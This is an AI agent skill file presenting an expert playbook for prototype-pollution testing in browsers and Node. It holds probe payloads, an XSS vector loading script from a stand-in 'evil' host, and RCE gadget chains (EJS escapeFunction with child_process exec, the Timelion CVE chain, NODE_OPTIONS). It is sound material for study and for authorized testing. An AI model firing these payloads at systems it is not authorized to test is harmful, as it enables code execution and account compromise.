---
name: prototype-pollution
description: >-
  Prototype pollution testing for JavaScript stacks. Use when user input is
  merged into objects (query parsers, JSON bodies, deep assign), when
  configuring libraries via untrusted keys, or when hunting RCE gadgets via
  polluted Object.prototype in Node or the browser.
---

# SKILL: Prototype Pollution — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert prototype pollution for client and server JS. Covers `__proto__` vs `constructor.prototype`, merge-sink detection, Express/qs-style black-box probes, and gadget chains (EJS, Timelion-class patterns, child_process/NODE_OPTIONS). Assumes you know object spread and prototype inheritance — focus is on **parser behavior** and **post-pollution sinks**.

Routing hint: When there is deep merge, recursive assign, `Object.assign` after `JSON.parse`, or URL query strings parsed into nested objects, prioritize suspecting PP.

## QUICK START

### Client-side first probes

```text
#__proto__[polluted]=1
#__proto__[polluted]=polluted
#constructor[prototype][polluted]=1
```

In scenarios where the fragment can be reflected into the DOM or framework routing, pair with `alert(1)` / `console` to observe whether global object properties are polluted.

```text
#__proto__[xxx]=alert(1)
```

### Server-side first probes (JSON / form)

```json
{"__proto__":{"polluted":true}}
```

```json
{"constructor":{"prototype":{"polluted":true}}}
```

After sending, check: do subsequent unrelated responses carry abnormal headers/status codes/JSON spacing, or does application logic read `Object.prototype.polluted` (see section 3 probe table).

### Quick boolean

If the target uses `lodash.merge`, `deep-extend`, `hoek.applyToDefaults`, or certain `qs`/`query-string` configurations, **raise priority**.

---

## 1. MECHANISM

**Prototype chain**: When accessing `obj.key`, if `obj` has no own property `key`, the lookup walks up `[[Prototype]]` until reaching `Object.prototype`.

**`__proto__`**: Many parsers treat the literal key `__proto__` as a magic key meaning "attach the following properties to the prototype" (a legacy accessible property path on `Object.prototype`). Merging `{ "__proto__": { "x": 1 } }` may be equivalent to `Object.prototype.x = 1` (depending on implementation and patch version).

**`constructor.prototype`**: `constructor` typically points to the object's constructor function; `constructor.prototype` is that constructor's `prototype` object. For plain objects this defaults to `Object.prototype`. Path example:

```json
{"constructor":{"prototype":{"polluted":1}}}
```

Not necessarily equivalent to `__proto__` (filtering, JSON parsing, Bun/Node differences), so **test both vectors**.

**Attack essence**: It is not "passing an extra parameter" — it is pointing controllable keys at the **prototype object** inside an **un-isolated merge algorithm**, giving **global** or **shared template context** malicious properties. Subsequent code that "normally" reads that property triggers the gadget.

---

## 2. CLIENT-SIDE DETECTION

### URL fragment

```text
https://app.example/page#__proto__[admin]=1
```

```text
https://app.example/#__proto__[xxx]=alert(1)
```

If routing or analytics parses the fragment into an object and then merges it, pollution may occur.

### `constructor.prototype` path

```text
#constructor[prototype][role]=admin
```

### DOM / property injection approach

If the framework treats attribute names as object keys during merge:

```text
__proto__[src]=//evil/xss.js
```

Event handler-style keys (implementation-dependent):

```text
__proto__[onerror]=alert(1)
```

**Verification**: Open a new page without the fragment and check in the console whether `Object.prototype` still has residual test keys; beware of browser extensions and DevTools interference.

---

## 3. SERVER-SIDE DETECTION (Express / Node, black-box)

The following payloads assume the body or query is **deep-parsed** into objects by **qs** or similar parsers (or combined with `body-parser`). Observe **global side effects**, not just the current endpoint's response.

| Payload (JSON example) | Expected observable signal |
|----------------------|----------------|
| `{"__proto__":{"parameterLimit":1}}` | Subsequent requests with multiple parameters are ignored or parsed abnormally (`qs`-style `parameterLimit`) |
| `{"__proto__":{"ignoreQueryPrefix":true}}` | `??foo=bar`-style double-question-mark prefix is accepted or behavior changes |
| `{"__proto__":{"allowDots":true}}` | `?foo.bar=baz` nested keys expand by dot notation |
| `{"__proto__":{"json spaces":" "}}` | JSON serialized responses show extra spacing (`JSON.stringify` affected by polluted spaces setting) |
| `{"__proto__":{"exposedHeaders":["foo"]}}` | CORS response includes `foo`-related header (if framework reads config from prototype) |
| `{"__proto__":{"status":510}}` | Some response status code changes to 510 or abnormal code (application reads `status` from object) |

**Key operational notes**: Send the pollution request first, then send a **clean** request to observe persistence; connection pooling and worker lifecycle affect whether the effect is "globally visible".

---

## 4. EXPLOITATION GADGETS

| Target / Scenario | Payload or Pattern | Notes |
|-------------|------------|------|
| **EJS** | `{"__proto__":{"client":1,"escapeFunction":"JSON.stringify; process.mainModule.require('child_process').exec('COMMAND')"}}` | Options like `escapeFunction` read from polluted prototype by template engine can lead to RCE; version and config dependent |
| **Timelion expression chain (CVE-2019-7609)** | `.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("COMMAND")')` | Historic chain: prototype pollution + timeline expression execution; useful for understanding **expression + PP** combination |
| **Node `child_process`** | Pollute `shell`, `argv0`, `env`, `NODE_OPTIONS`, etc. (merged into `exec`/`fork` options object) | Depends on whether subsequent `spawn`/`fork` reads options from the prototype chain |
| **Generic constructor path** | `{"constructor":{"prototype":{"foo":"bar"}}}` | Bypasses weak validation that only filters the `__proto__` key |

**Chain thinking**: pollution -> some dependency reads `obj.settings.xxx` without `hasOwnProperty` -> RCE / SSRF / path traversal.

---

## 5. TOOLS

| Project | Use Case |
|------|------|
| **yeswehack/pp-finder** | Assists in locating PP-susceptible merge points and patterns |
| **yuske/silent-spring** | Research and detection of related prototype pollution surface |
| **yuske/server-side-prototype-pollution** | Server-side PP test suite/approaches |
| **BlackFan/client-side-prototype-pollution** | Browser-side PP cases and payloads |
| **portswigger/server-side-prototype-pollution** | Burp ecosystem extension/supporting materials |
| **msrkp/PPScan** | Scanning/verification assistance |

Prioritize use on **authorized** targets; automated tools may produce side effects on stateful applications.

---

## DECISION TREE

```
                    Input merged into nested object?
                    (query, JSON, GraphQL vars, YAML→JSON)
                                |
               NO --------------+-------------- YES
               |                              |
        Other vuln class                Parser allows __proto__ /
                                        constructor.prototype keys?
                                                    |
                                    NO --------------+-------------- YES
                                    |                              |
                             Check unicode /                    Confirm global effect:
                             bypass of key names               clean follow-up request
                                    |                              |
                                    +--------------+----------------+
                                                   |
                                                   v
                                    Gadget present? (template, spawn, JSON.stringify opts, CORS)
                                                   |
                              NO ------------------+------------------ YES
                              |                                         |
                       Report PP as DoS /              Build minimal RCE or
                       logic impact                   high-impact PoC
                              |                                         |
                              +---------------------+-------------------+
                                                    |
                                                    v
                              Client-side: fragment / DOM / third-party script
                              Server-side: qs/body-parser/lodash/deep-merge version audit
```

---

## TESTING CHECKLIST

- [ ] Test `__proto__` pollution via JSON body, query string, form data
- [ ] Test `constructor.prototype` pollution as alternative vector
- [ ] Identify merge/deepClone/assign sinks in client-side JS
- [ ] Test server-side prototype pollution (Node.js merge/extend/lodash)
- [ ] Test pollution via HTTP headers (X-Forwarded-For, custom headers)
- [ ] Verify pollution succeeded: check `Object.keys({}).length` or custom property
- [ ] Test exploitation gadgets (DOMMatrix, RegExp, client-side routing bypass)
- [ ] Test property override leading to auth bypass or XSS

## MCP TOOLS

| Tool | Use Case |
|------|----------|
| `http_framework_test` | Send crafted requests with `__proto__` and `constructor.prototype` payloads in JSON body or query |
| `http_repeater` | Replay and modify prototype pollution probes to confirm global side effects |
| `browser_agent_inspect` | Browser inspection to test client-side prototype pollution via URL fragments |
| `nuclei_scan` | Automated scanning for known prototype pollution vulnerabilities and gadgets |

---

## RELATED ROUTING

- Input routing and multi-class injection parallel entry point -> [Injection Testing Router](../command-injection/SKILL.md).
- Template execution chains (non-PP) -> [SSTI](../ssti/SKILL.md).
- Insecure deserialization (non-JS prototype) -> [Deserialization](../deserialization/SKILL.md).
